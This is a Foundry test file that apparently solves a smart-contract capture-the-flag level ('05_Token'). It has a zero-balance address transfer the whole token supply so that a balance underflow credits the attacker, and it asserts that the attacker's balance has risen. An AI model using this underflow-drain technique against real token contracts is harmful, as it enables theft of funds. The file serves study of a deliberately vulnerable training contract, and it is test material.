// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/05_Token.sol";

contract TokenTest is Test {
    Token _token;
    address deployer;
    address attacker;
    
    uint supply = 21000000;
    uint playerSupply = 20;

    function setUp() public {
        deployer = address(this);
        attacker = vm.addr(1);

        _token = new Token(supply);
        _token.transfer(attacker, playerSupply);
    }

    function testSolution() public {
        address attackersFriend = vm.addr(2);
        vm.startPrank(attackersFriend);

        _token.transfer(attacker, supply);

        assertTrue(_token.balanceOf(attacker) > playerSupply, "Attacker has not increased their balance!");
    }
}
